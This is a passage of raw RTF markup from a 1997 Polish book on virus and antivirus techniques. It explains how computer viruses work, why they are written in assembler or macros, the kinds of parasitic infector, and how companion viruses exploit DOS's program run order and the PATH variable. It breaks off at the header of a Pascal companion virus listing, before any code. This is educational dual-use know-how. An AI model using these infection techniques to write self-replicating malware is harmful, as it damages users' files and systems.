si\uc1\u281\'ea }{\f1\fs24\lang1045{\*\listtag0}s}{\f0\fs24\lang1045{\*\listtag0}tale rozwijana, dost\uc1\u281\'eapna w angielskoj\uc1\u281\'eazycznej wersji elektronicznej, lista przerwa\uc1\u324\'f1 Interrupt List Ralpha Browne'a.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Na koniec warto jeszcze doda\uc1\u263\'e6 kilka uwag o s\uc1\u322\'b3ownictwie u\uc1\u380\'bfywanym w opracowaniu. Wi\uc1\u281\'eakszo\uc1\u347\'9c\uc1\u263\'e6 termin\'f3w zwi\uc1\u261\'b9zanych z komputerami jest si\uc1\u322\'b3\uc1\u261\'b9 rzeczy pochodzenia angielskiego. Pr\'f3by tworzenia ich polskich odpowiednik\'f3w mijaj\uc1\u261\'b9 si\uc1\u281\'ea najcz\uc1\u281\'ea\uc1\u347\'9cciej z celem, gdy\uc1\u380\'bf powsta\uc1\u322\'b3e w ten spos\'f3b neologizmy nie odzwierciedlaj\uc1\u261\'b9 w pe\uc1\u322\'b3ni sensu s\uc1\u322\'b3\'f3w angielskich. Liczne przyk\uc1\u322\'b3ady z literatury komputerowej (i nie tylko) ostatni}{\f1\fs24\lang1045{\*\listtag0}c}{\f0\fs24\lang1045{\*\listtag0}h kilku lat dowiod\uc1\u322\'b3y, i\uc1\u380\'bf jedynym sensownym wyj\uc1\u347\'9cciem z tej sytuacji jest integracja pewnych termin\'f3w obcoj\uc1\u281\'eazycznych z j\uc1\u281\'eazykiem polskim. Z tego te\uc1\u380\'bf powodu w opracowaniu u\uc1\u380\'bfywane s\uc1\u261\'b9 (w niezb\uc1\u281\'eadnym minimum) terminy angielskie opatrzone odpowiednimi komentarzami}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}w j\uc1\u281\'eazyku polskim. W sytuacji niemo\uc1\u380\'bfno\uc1\u347\'9cci znalezienia adekwatnego polskiego odpowiednika dla s\uc1\u322\'b3owa angielskiego u\uc1\u380\'bfywane b\uc1\u281\'eadzie s\uc1\u322\'b3owo obce (np. stealth).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch 1.1. Co to jest i jak dzia\uc1\u322\'b3a wirus komputerowy}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wirus komputerowy definiowany jest najcz\uc1\u281\'ea\uc1\u347\'9cciej jako kr\'f3tki program maj\uc1\u261\'b9cy zdolno\uc1\u347\'9c\uc1\u263\'e6 samopowielania po jego uruchomieniu. Jest on zwykle przenoszony w zainfekowanych wcze\uc1\u347\'9cniej plikach lub w pierwszych sektorach fizycznych logicznych dysk\'f3w. Proces infekcji polega zazwyczaj na odpowiedniej modyfikacji struktury p}{\f1\fs24\lang1045{\*\listtag0}l}{\f0\fs24\lang1045{\*\listtag0}iku albo sektora. Zainfekowan\uc1\u261\'b9 ofiar\uc1\u281\'ea cz\uc1\u281\'easto nazywa si\uc1\u281\'ea nosicielem (ang. host), a proces samopowielania - replikacj\uc1\u261\'b9. D\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 typowego wirusa waha si\uc1\u281\'ea w granicach od kilkudziesi\uc1\u281\'eaciu bajt\'f3w do kilku kilobajt\'f3w i w du\uc1\u380\'bfym stopniu zale\uc1\u380\'bfy od umiej\uc1\u281\'eatno\uc1\u347\'9cci progr}{\f1\fs24\lang1045{\*\listtag0}a}{\f0\fs24\lang1045{\*\listtag0}mistycznych jego tw\'f3rcy, a tak\uc1\u380\'bfe od j\uc1\u281\'eazyka programowania u\uc1\u380\'bfytego do jego napisania. Od umiej\uc1\u281\'eatno\uc1\u347\'9cci i zamierze\uc1\u324\'f1 autora zale\uc1\u380\'bf\uc1\u261\'b9 tak\uc1\u380\'bfe efekty, jakie wirus b\uc1\u281\'eadzie wywo\uc1\u322\'b3ywa\uc1\u322\'b3 w zainfekowanym systemie (oczywi\uc1\u347\'9ccie, nie zawsze musi by\uc1\u263\'e6 to pr\'f3ba formatowania dysku }{\f1\fs24\lang1045{\*\listtag0}twardego).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wi\uc1\u281\'eakszo\uc1\u347\'9c\uc1\u263\'e6 z istniej\uc1\u261\'b9cych wirus\'f3w zawiera tylko kod odpowiedzialny za replikacj\uc1\u281\'ea (ang. dropper), natomiast "specjalne efekty" to zwykle dzia\uc1\u322\'b3ania uboczne spowodowane przez b\uc1\u322\'b3\uc1\u281\'eady.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Z powy\uc1\u380\'bfszego wynika jednoznacznie, i\uc1\u380\'bf pomijaj\uc1\u261\'b9c istniej\uc1\u261\'b9c\uc1\u261\'b9 zawsze mo\uc1\u380\'bfliwo\uc1\u347\'9c\uc1\u263\'e6 sabota\uc1\u380\'bfu, zara\uc1\u380\'bfenie komputera wirusem nast\uc1\u261\'b9pi\uc1\u263\'e6 mo\uc1\u380\'bfe tylko przy niejawnej wsp\'f3\uc1\u322\'b3pracy u\uc1\u380\'bfytkownika, kt\'f3ry, b\uc1\u261\'b9d\uc1\u378\'9f to uruchamiaj\uc1\u261\'b9c zara\uc1\u380\'bfony program, b\uc1\u261\'b9d\uc1\u378\'9f pr\'f3buj\uc1\u261\'b9c wczyta\uc1\u263\'e6 system z zara\uc1\u380\'bfonej dyskietki, a nawet odczytuj\uc1\u261\'b9c zainfekowany dokument, nie\uc1\u347\'9cwiadom}{\f1\fs24\lang1045{\*\listtag0}i}{\f0\fs24\lang1045{\*\listtag0}e sam instaluje wirusa w u\uc1\u380\'bfywanym przez siebie komputerze.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch 1.2. J\uc1\u281\'eazyki programowania wykorzystywane do pisania wirus\'f3w.}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Do zaprogramowania wirusa wystarczy znajomo\uc1\u347\'9c\uc1\u263\'e6 dowolnego popularnego j\uc1\u281\'eazyka programowania, np. Pascala czy C, jednak najwi\uc1\u281\'eakszy procent wirus\'f3w pisany jest w czystym asemblerze. Spowodowane jest to g\uc1\u322\'b3\'f3wnie specyfik\uc1\u261\'b9 kodu generowanego przez ten j\uc1\u281\'eazyk, a zw\uc1\u322\'b3aszcza jego zwi\uc1\u281\'eaz\uc1\u322\'b3o\uc1\u347\'9cci\uc1\u261\'b9. Kod maszynowy programu, kt\'f3ry z punktu widzenia u\uc1\u380\'bfytkownika nie robi nic, w j\uc1\u281\'eazykach wysokiego poziomu zajmie }{\f1\fs24\lang1045{\*\listtag0}o}{\f0\fs24\lang1045{\*\listtag0}d kilkuset bajt\'f3w do kilku, a nawet kilkuset kilobajt\'f3w. W asemblerze podobny program zajmie od jednego (instrukcja RET w pliku COM) do czterech bajt\'f3w (wywo\uc1\u322\'b3anie funkcji 4Ch przerwania 21h). Spowodowane jest to tym, i\uc1\u380\'bf do ka\uc1\u380\'bfdego wygenerowanego przez sie}{\f1\fs24\lang1045{\*\listtag0}b}{\f0\fs24\lang1045{\*\listtag0}ie programu kompilatory j\uc1\u281\'eazyk\'f3w wysokiego poziomu dodaj\uc1\u261\'b9 standardowe prologi i epilogi, niewidoczne dla pisz\uc1\u261\'b9cego w danym j\uc1\u281\'eazyku programisty, kt\'f3re s\uc1\u261\'b9 odpowiedzialne m.in. za obs\uc1\u322\'b3ug\uc1\u281\'ea b\uc1\u322\'b3\uc1\u281\'ead\'f3w, stosu, operacje we/wy itp. Mo\uc1\u380\'bfna powiedzie\uc1\u263\'e6, i\uc1\u380\'bf d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 programu}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}wynikowego (rozumianego jako kod maszynowy) jest wprost proporcjonalna do poziomu j\uc1\u281\'eazyka programowania, w kt\'f3rym zosta\uc1\u322\'b3 on napisany. Na korzy\uc1\u347\'9c\uc1\u263\'e6 asemblera przemawia tak\uc1\u380\'bfe fakt, i\uc1\u380\'bf z jego poziomu mamy bardzo du\uc1\u380\'bf\uc1\u261\'b9 swobod\uc1\u281\'ea w dost\uc1\u281\'eapie do pami\uc1\u281\'eaci czy port\'f3w, a }{\f1\fs24\lang1045{\*\listtag0}p}{\f0\fs24\lang1045{\*\listtag0}rogramista ma mo\uc1\u380\'bfliwo\uc1\u347\'9c\uc1\u263\'e6 \uc1\u347\'9cwiadomego wp\uc1\u322\'b3ywu na kszta\uc1\u322\'b3t przysz\uc1\u322\'b3ego programu, np. w zakresie u\uc1\u380\'bfywanych instrukcji czy rozwi\uc1\u261\'b9za\uc1\u324\'f1 programowych. Jak wida\uc1\u263\'e6, programy napisane w asemblerze s\uc1\u261\'b9 optymalne pod wzgl\uc1\u281\'eadem szybko\uc1\u347\'9cci dzia\uc1\u322\'b3ania i d\uc1\u322\'b3ugo\uc1\u347\'9cci kodu, a wi\uc1\u281\'eac j\uc1\u281\'eazyk}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}ten jest jakby stworzony do programowania wirus\'f3w. Jedyn\uc1\u261\'b9 wad\uc1\u261\'b9 asemblera jest to, i\uc1\u380\'bf program\'f3w w nim napisanych nie mo\uc1\u380\'bfna przenosi\uc1\u263\'e6 na komputery o innej architekturze, st\uc1\u261\'b9d mog\uc1\u261\'b9 one egzystowa\uc1\u263\'e6 tylko w jednej rodzinie komputer\'f3w.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Opr\'f3cz typowych j\uc1\u281\'eazyk\'f3w programowania do zaprojektowania wirusa mo\uc1\u380\'bfna wykorzysta\uc1\u263\'e6 j\uc1\u281\'eazyki makr, wbudowane w nowoczesne edytory tekst\'f3w lub arkusze kalkulacyjne. Zawarte w nich mechanizmy pozwalaj\uc1\u261\'b9 na infekcj\uc1\u281\'ea ka\uc1\u380\'bfdego otwieranego przez program dokumentu lub arkusza. Ze wzgl\uc1\u281\'eadu n}{\f1\fs24\lang1045{\*\listtag0}a}{\f0\fs24\lang1045{\*\listtag0} poziom abstrakcji na Jakim operuj\uc1\u261\'b9 j\uc1\u281\'eazyki makr, s\uc1\u261\'b9 one wymarzonym narz\uc1\u281\'eadziem do tworzenia wirus\'f3w, zw\uc1\u322\'b3aszcza dla pocz\uc1\u261\'b9tkuj\uc1\u261\'b9cych programist\'f3w. Nie musz\uc1\u261\'b9 si\uc1\u281\'ea oni bowiem przedziera\uc1\u263\'e6 przez dokumentacj\uc1\u281\'ea systemu czy te\uc1\u380\'bf formaty infekowanych plik\'f3w. Wszystkie o}{\f1\fs24\lang1045{\*\listtag0}p}{\f0\fs24\lang1045{\*\listtag0}eracje na fizycznych obiektach s\uc1\u261\'b9 zaimplementowane w makrach i wykonuj\uc1\u261\'b9 si\uc1\u281\'ea bez konieczno\uc1\u347\'9cci ingerencji programisty.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch ROZDZIA\uc1\u321\'a3 2}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 2.1. Wirusy paso\uc1\u380\'bfytnicze (ang. parasite infectors)}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch W zasadzie wi\uc1\u281\'eakszo\uc1\u347\'9c\uc1\u263\'e6 istniej\uc1\u261\'b9cych wirus\'f3w to wirusy paso\uc1\u380\'bfytnicze, kt\'f3re wykorzystuj\uc1\u261\'b9 swoje ofiary do transportu, modyfikuj\uc1\u261\'b9c ich struktur\uc1\u281\'ea wewn\uc1\u281\'eatrzn\uc1\u261\'b9. Jedynym ratunkiem dla zainfekowanych obiekt\'f3w jest u\uc1\u380\'bfycie szczepionki lub w ostateczno\uc1\u347\'9cci kopii zapasowych, gdy\uc1\u380\'bf zzara\uc1\u380\'bfane pliki z regu\uc1\u322\'b3y nie s\uc1\u261\'b9 przez wirusa leczone. Wyj\uc1\u261\'b9tek stan}{\f1\fs24\lang1045{\*\listtag0}o}{\f0\fs24\lang1045{\*\listtag0}wi\uc1\u261\'b9 nieliczne wirusy wykorzystuj\uc1\u261\'b9ce pliki tylko do transportu mi\uc1\u281\'eadzy komputerami, maj\uc1\u261\'b9ce za g\uc1\u322\'b3\'f3wny cel infekcj\uc1\u281\'ea tablicy partycji lub BOOT sektora dysku twardego. Po zainfekowaniu kt\'f3rego\uc1\u347\'9c z tych obiekt\'f3w wirus zmienia dzia\uc1\u322\'b3anie i leczy wszystkie u\uc1\u380\'bfywane p}{\f1\fs24\lang1045{\*\listtag0}l}{\f0\fs24\lang1045{\*\listtag0}iki znajduj\uc1\u261\'b9ce si\uc1\u281\'ea na twardym dysku, a infekuje jedynie pliki ju\uc1\u380\'bf znajduj\uc1\u261\'b9ce si\uc1\u281\'ea na dyskietkach lub dopiero na nie kopiowane.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ze wzgl\uc1\u281\'eadu na miejsce zajmowane w zainfekowanych plikach wirusy paso\uc1\u380\'bfytnicze dzieli si\uc1\u281\'ea na:\line > Wirusy nadpisuj\uc1\u261\'b9ce (ang. overwrite infectors), lokuj\uc1\u261\'b9ce si\uc1\u281\'ea na pocz\uc1\u261\'b9tku pliku, cz\uc1\u281\'easto nie zapami\uc1\u281\'eatuj\uc1\u261\'b9ce poprzedniej zawarto\uc1\u347\'9cci pliku (co w efekcie nieodwracalnie niszczy plik);\line > Wirusy lokuj\uc1\u261\'b9ce si\uc1\u281\'ea na ko\uc1\u324\'f1cu pliku (ang. end of file infectors), najbardziej rozpowszechniona odmiana wirus\'f3w pa}{\f1\fs24\lang1045{\*\listtag0}s}{\f0\fs24\lang1045{\*\listtag0}o\uc1\u380\'bfytniczych, kt\'f3re modyfikuj\uc1\u261\'b9 pewne ustalone struktury na pocz\uc1\u261\'b9tku pliku tak, aby wskazywa\uc1\u322\'b3y na wirusa, po czym dopisuj\uc1\u261\'b9 si\uc1\u281\'ea na jego ko\uc1\u324\'f1cu;\line > Wirusy nag\uc1\u322\'b3\'f3wkowe (ang. header infectors), lokuj\uc1\u261\'b9ce si\uc1\u281\'ea w nag\uc1\u322\'b3\'f3wku plik\'f3w EXE przeznaczonych dla systemu DOS; wyk}{\f1\fs24\lang1045{\*\listtag0}o}{\f0\fs24\lang1045{\*\listtag0}rzystuj\uc1\u261\'b9 one fakt, i\uc1\u380\'bf nag\uc1\u322\'b3\'f3wek plik\'f3w EXE jest standardowo ustawiany przez programy linkuj\uc1\u261\'b9ce na wielokrotno\uc1\u347\'9c\uc1\u263\'e6 jednego sektora (512 bajt\'f3w). Zwykle wirusy te nie przekraczaj\uc1\u261\'b9 rozmiaru jednego sektora i infekuje poprzez przej\uc1\u281\'eacie funkcji BIOS s\uc1\u322\'b3u\uc1\u380\'bf\uc1\u261\'b9cych do }{\f1\fs24\lang1045{\*\listtag0}odczytu i zapisu sektor\'f3w (02,03/13);}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > Wirusy lokuj\uc1\u261\'b9ce si\uc1\u281\'ea w pliku w miejscu gdzie jest jaki\uc1\u347\'9c pusty, nie wykorzystany obszar (np. wype\uc1\u322\'b3niony ci\uc1\u261\'b9giem zer), kt\'f3ry mo\uc1\u380\'bfna nadpisa\uc1\u263\'e6 nie niszcz\uc1\u261\'b9c pliku (ang. cave infectors),}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > Wirusy lokuj\uc1\u261\'b9ce si\uc1\u281\'ea w dowolnym miejscu pliku (ang. surface infectors), do\uc1\u347\'9c\uc1\u263\'e6 rzadkie, bardzo trudne do napisania;}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > Wirusy wykorzystuj\uc1\u261\'b9ce cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6 ostatniej Jednostki Alokacji Pliku JAP (ang. slack space infector), korzystaj\uc1\u261\'b9ce z faktu, i\uc1\u380\'bf plik rzadko zajmuje dok\uc1\u322\'b3adnie wielokrotno\uc1\u347\'9c\uc1\u263\'e6 jednej JAP.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch 2.2. Wirusy towarzysz\uc1\u261\'b9ce (ang. }{\f1\fs28\i\lang1045{\*\listtag0}companion infectors}{\f1\fs28\lang1045{\*\listtag0})}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wirusy tego typu s\uc1\u261\'b9 najcz\uc1\u281\'ea\uc1\u347\'9cciej pisane w j\uc1\u281\'eazykach wysokiego poziomu. Atakuj\uc1\u261\'b9 one pliki, a ich dzia\uc1\u322\'b3anie opiera si\uc1\u281\'ea na hierarchii stosowanej przez DOS podczas uruchamiania program\'f3w.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch W momencie uruchomian}{\f0\fs24\lang1045{\*\listtag0}ia programu, w przypadku nie podania rozszerzenia uruchamianego pliku, najpierw poszukiwany jest plik o rozszerzeniu COM, potem EXE, a na ko\uc1\u324\'f1cu BAT. W przypadku wykorzystywania interpretatora polece\uc1\u324\'f1 4DOS dochodz\uc1\u261\'b9 Jeszcze pliki BTM, poszukiwane podczas ur}{\f1\fs24\lang1045{\*\listtag0}u}{\f0\fs24\lang1045{\*\listtag0}chamiania programu przed plikami BAT. Na przyk\uc1\u322\'b3ad, je\uc1\u380\'bfeli w jednym katalogu istniej\uc1\u261\'b9 3 pliki:}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch - PROG.BAT,}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch - PROG.COM,}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch - PROG.EXE,}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch to kolejno\uc1\u347\'9c\uc1\u263\'e6 ich uruchamiania by\uc1\u322\'b3aby nast\uc1\u281\'eapuj\uc1\u261\'b9ca:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch - PROG.COM,}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch - PROG.EXE,}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch - PROG.BAT.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Plik PROG.COM b\uc1\u281\'eadzie si\uc1\u281\'ea uruchamia\uc1\u263\'e6, ilekro\uc1\u263\'e6 b\uc1\u281\'eadziemy podawa\uc1\u263\'e6 nazw\uc1\u281\'ea PROG bez rozszerzenia lub z rozszerzeniem COM. Plik PROG.EXE mo\uc1\u380\'bfna w tym wypadku uruchomi\uc1\u263\'e6 wy\uc1\u322\'b3\uc1\u261\'b9cznie poprzez podanie jego pe\uc1\u322\'b3nej nazwy, b\uc1\u261\'b9d\uc1\u378\'9f te\uc1\u380\'bf poprzez uprzednie usuni\uc1\u281\'eacie pliku PROG.COM z danego katalogu. Z kolei uruchomienie}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}pilku BAT wymaga albo usuni\uc1\u281\'eacia z katalogu obu plik\'f3w: PROG-COM i PROG.EXE, albo te\uc1\u380\'bf podania w linii polece\uc1\u324\'f1 ca\uc1\u322\'b3ej jego nazwy. Jak wida\uc1\u263\'e6, wirus ma kilka mo\uc1\u380\'bfliwo\uc1\u347\'9cci, aby zainfekowa\uc1\u263\'e6 uruchamiany program:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch - Istnieje plik COM: nie mo\uc1\u380\'bfna zastosowa\uc1\u263\'e6 infekcji;}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch - }{\f0\fs24\lang1045{\*\listtag0}Istnieje plik EXE: mo\uc1\u380\'bfna utworzy\uc1\u263\'e6 plik o takiej samej nazwie, o rozszerzeniu COM, zawieraj\uc1\u261\'b9cy wirusa;}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch - Istnieje plik BAT: mo\uc1\u380\'bfna utworzy\uc1\u263\'e6 plik o takiej samej nazwie, o rozszerzeniu COM lub EXE, zawieraj\uc1\u261\'b9cy wirusa.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Nast\uc1\u281\'eapna pr\'f3ba uruchomienia tak zara\uc1\u380\'bfonego programu spowoduje najpierw uruchomienie podszywaj\uc1\u261\'b9cego si\uc1\u281\'ea pod program wirusa, a dopiero ten, po zako\uc1\u324\'f1czeniu pracy, przeka\uc1\u380\'bfe sterowanie do programu macierzystego, najcz\uc1\u281\'ea\uc1\u347\'9cciej poprzez wywo\uc1\u322\'b3anie programu interpretatora polece\uc1\u324\'f1 z parametrem: /C NazwaPlikuO}{\f1\fs24\lang1045{\*\listtag0}fiary.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ciekawym rozszerzeniem techniki opisanej powy\uc1\u380\'bfej jest spos\'f3b infekcji stosowany przez wirusy towarzysz\uc1\u261\'b9ce, wykorzystuj\uc1\u261\'b9ce zmienn\uc1\u261\'b9 \uc1\u347\'9crodowiskow\uc1\u261\'b9 PATH (ang. path companion infectors). Zmienna PATH okre\uc1\u347\'9cla list\uc1\u281\'ea katalog\'f3w przeszukiwanych przez system DOS podczas uruchamiania programu. Wirus wykorzystuj\uc1\u261\'b9cy t\uc1\u281\'ea technik\uc1\u281\'ea tworzy plik, zawieraj\uc1\u261\'b9cy kod wirusa w innym katalogu, znajduj\uc1\u261\'b9cym si\uc1\u281\'ea w zmiennej \uc1\u347\'9crodowiskowej PATH przed katalogiem, w kt\'f3rym znajduje si\uc1\u281\'ea zara\uc1\u380\'bfana ofiara. W tym wypadku infekcj\uc1\u281\'ea mo\uc1\u380\'bfna zast}{\f1\fs24\lang1045{\*\listtag0}o}{\f0\fs24\lang1045{\*\listtag0}sowa\uc1\u263\'e6 dla dowolnego z plik\'f3w COM, EXE, BAT, gdy\uc1\u380\'bf kolejno\uc1\u347\'9c\uc1\u263\'e6 uruchamiania zale\uc1\u380\'bfna jest przede wszystkim od zawarto\uc1\u347\'9cci zmiennej PATH. Na przyk\uc1\u322\'b3ad, je\uc1\u380\'bfeli zmienna \uc1\u347\'9crodowiskowa PATH okre\uc1\u347\'9clona jest jako:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PATH = C:\\;C:\\DOS;C:\\WINDOWS,}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch a w katalogu C:\\DOS umie\uc1\u347\'9ccimy plik WIN.BAT, to podczas kolejnego wywo\uc1\u322\'b3ywania systemu WINDOWS (poprzez uruchomienie programu C:\\WINDOWS\\WIN.COM bez podawania \uc1\u347\'9ccie\uc1\u380\'bfki, czyli najcz\uc1\u281\'ea\uc1\u347\'9cciej WIN [ENTER]) z katalogu innego ni\uc1\u380\'bf C:\\WINDOWS system uruchomi najpierw plik C:\\DOS\\WIN.BAT, a te}{\f1\fs24\lang1045{\*\listtag0}n}{\f0\fs24\lang1045{\*\listtag0} dopiero uruchomi w\uc1\u322\'b3a\uc1\u347\'9cciwy program C:\\WINDOWS\\WIN.COM. Poni\uc1\u380\'bfej przedstawiono przyk\uc1\u322\'b3ad prostego wirusa towarzysz\uc1\u261\'b9cego. Jest on napisany w j\uc1\u281\'eazyku Pascal i infekuje par\uc1\u281\'ea plik\'f3w COM, EXE.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch (*;------------------------------------------------------------------------;*)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch (*;                                                                        ;*)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch (*;      Czesc ksiazki : "Nowoczesne techniki wirusowe i antywirusowe"     ;*)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch (*;                                                                        ;*)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch (*;                      KOMPAN v1.0, Autor : Adam Blaszczyk 1997          ;*)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch (*;                                                                        ;*)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch (*;             Prosty wirus typu towarzyszacego                           ;*)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch (*;             Infekuje pliki EXE w biezacym katalogu                     ;*)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch (*;             Do istniejacego pliku EXE dopisuje plik o rozszerzeniu COM ;*)}{\f2\fs24\lang1045{\*\listtag0}\par}
